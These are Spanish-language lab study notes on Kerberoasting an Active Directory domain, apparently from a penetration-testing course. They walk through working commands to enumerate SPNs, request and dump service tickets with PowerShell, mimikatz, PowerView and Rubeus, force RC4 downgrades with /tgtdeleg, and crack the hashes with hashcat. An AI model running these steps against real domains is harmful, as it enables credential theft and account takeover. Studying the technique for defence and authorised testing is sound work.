
## Metodo semimanual

Usando [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\))

1. Enumeramos SPNs 

```
setspn.exe -Q */*
```
![[Pasted image 20260928115237.png]]

	Notaremos que se devuelven muchos SPN diferentes para los distintos hosts del dominio. Nos centraremos en las `cuentas de usuario` e ignoraremos las cuentas de equipo que devuelve la herramienta


2. Solicitamos el Ticket TGS desde PS a una cuenta y lo cargamos en memoria para poder extraerlo con Mimikatz

```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
![[Pasted image 20260928115704.png]]

- Podriamos obtener tambien todos los tickets usando el mismo metodo pero traera todas las cuentas de equipo tambien

```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
![[Pasted image 20260928115845.png]]

3. Extraemos los tickets de la memoria con mimikatz

```
.\mimikatz.exe
# base64 /out:true
# kerberos::list /export
```
![[Pasted image 20260928115954.png]]

Si no especificamos el comando `base64 /out:true`, Mimikatz extraerá los tickets y los escribirá en archivos `.kirbi`. Dependiendo de nuestra posición en la red y si podemos mover fácilmente los archivos a nuestro host de ataque, esto puede ser más fácil cuando vayamos a crackear los tickets

4. Pasamos el BASE64 a nuestro host y lo preparamos y copiamos en un archivo

```
echo "<base64 blob>" | tr -d \\n
```
![[Pasted image 20260928120100.png]]

5. Colocamos la salida en un .kirbi

```
cat encoded_file | base64 -d > sqldev.kirbi
```
![[Pasted image 20260928120218.png]]

6. Usamos [kirbi2john](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) para extraer el TGS

```
python2.7 kirbi2john.py sqldev.kirbi
```
![[Pasted image 20260928120259.png]]

7. Esto creará un archivo llamado `crack_file`. Luego debemos modificar un poco el archivo para poder usar Hashcat contra el hash.

```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

8. Crackeamos

```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20260928120506.png]]

	Si decidimos omitir la salida base64 con Mimikatz y escribimos `mimikatz # kerberos::list /export`, el archivo (o archivos) `.kirbi` se escribirá en el disco. En este caso, podemos descargar el/los archivo(s) y ejecutar `kirbi2john.py` directamente sobre ellos, omitiendo el paso de decodificación base64.


## Ruta automatizada / basada en herramientas

#### PowerView

1. Usemos [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) para extraer los tickets TGS y convertirlos en formato para Hashcat

```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
![[Pasted image 20260928121113.png]]

2. Desde aqui podriamos apuntar a un usuario especifico

```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
![[Pasted image 20260928121155.png]]

3. Exportamos todos los tickets a un archivo CSV

```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

4. Vemos el contenido del CSV

```
cat .\ilfreight_tgs.csv
```
![[Pasted image 20260928121245.png]]


#### Rubeus

Podemos usar [Rubeus](https://github.com/GhostPack/Rubeus) para hacerlo de una forma mas rapida y facil

```
.\Rubeus.exe
```
![[Pasted image 20260928121337.png]]

Como podemos ver al desplazarnos por el menú de ayuda de Rubeus, la herramienta tiene una gran cantidad de opciones para interactuar con Kerberos:

- Realizar Kerberoasting y guardar los hashes en un archivo
- Usar credenciales alternativas
- Realizar Kerberoasting combinado con un ataque pass-the-ticket
- Realizar Kerberoasting "opsec" para filtrar cuentas con AES habilitado
- Solicitar tickets para contraseñas de cuentas establecidas entre un rango de fechas específico
- Establecer un límite en el número de tickets solicitados
- Realizar Kerberoasting AES

2. Usamos /stats para ver algunas caracteristicas de los usuarios kerberoastable

```
.\Rubeus.exe kerberoast /stats
```
![[Pasted image 20260928121509.png]]

	Aqui vemos que hay 9 cuentas de usuarios kerberoastables, 7 admiten cifrado RC4 para las solicitudes de tickets y 2 AES. Todas las pass de las cuentas fueron establecidas en 2022

```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

3. Usamos rubeus para solicitar tickets de cuentas con atributo `admincount = 1` y especificamos `/nowrap` para que el hash se pueda copiar facilmente

```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
![[Pasted image 20260928122206.png]]

#### NOTA SOBRE LOS TIPOS DE CIFRADO

Las herramientas de Kerberoasting suelen solicitar el `cifrado RC4` al realizar el ataque e iniciar las solicitudes TGS-REQ. Esto se debe a que RC4 es [más débil](https://www.stigviewer.com/stigs/microsoft_windows_10/2025-02-25/finding/V-220936) y más fácil de crackear

Al realizar Kerberoasting en la mayoría de los entornos, obtendremos hashes que comienzan con `$krb5tgs$23$*`, un ticket cifrado con RC4 (tipo 23). A veces recibiremos un hash cifrado con AES-256 (tipo 18) o un hash que comienza con `$krb5tgs$18$*`

1. Comencemos creando una cuenta con SPN llamada `testspn` y usando Rubeus para hacer Kerberoast a este usuario específico para probar esto. Como podemos ver, recibimos el ticket TGS cifrado con RC4 (tipo 23).

```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
![[Pasted image 20260928122742.png]]

2. Al verificar con PowerView, podemos ver que el atributo `msDS-SupportedEncryptionTypes` está establecido en `0`. La tabla [aquí](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) nos dice que un valor decimal de `0` significa que no se define un tipo de cifrado específico y se establece el predeterminado de `RC4_HMAC_MD5`

```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
![[Pasted image 20260928122807.png]]

3. Crackeando el ticket con Hashcat y rockyou.txt

```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20260928122938.png]]

Supongamos que nuestro cliente ha configurado las cuentas con SPN para que admitan el cifrado AES 128/256.

![[Pasted image 20260928123000.png]]

Si comprobamos esto con PowerView, veremos que el atributo `msDS-SupportedEncryptionTypes` está establecido en `24`, lo que significa que los tipos de cifrado AES 128/256 son los únicos compatibles.

```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
![[Pasted image 20260928123023.png]]

Solicitando un nuevo ticket

```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
![[Pasted image 20260928123042.png]]

Crackeamos:

```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20260928123136.png]]

Viendo el tiempo que tardó en crackearse:

![[Pasted image 20260928123201.png]]

Podemos usar Rubeus con el flag `/tgtdeleg` para especificar que solo queremos cifrado RC4 al solicitar un nuevo ticket de servicio

![[Pasted image 20260928123312.png]]

	En la imagen anterior, podemos ver que al proporcionar el flag `/tgtdeleg`, la herramienta solicitó un ticket RC4 a pesar de que los tipos de cifrado compatibles se enumeran como AES 128/256

![[Pasted image 20260928123611.png]]

- MODIFICAR EL CIFRADO (NO HACER)

Es posible editar los tipos de cifrado utilizados por Kerberos. Esto se puede hacer abriendo la Directiva de grupo, editando la Directiva de dominio predeterminada y eligiendo: `Configuración del equipo > Directivas > Configuración de Windows > Configuración de seguridad > Directivas locales > Opciones de seguridad`, luego haciendo doble clic en `Seguridad de red: configurar tipos de cifrado permitidos para Kerberos` y seleccionando el tipo de cifrado deseado permitido para Kerberos. Eliminar todos los demás tipos de cifrado excepto `RC4_HMAC_MD5` permitiría que el ejemplo de rebaja anterior ocurriera en 2019
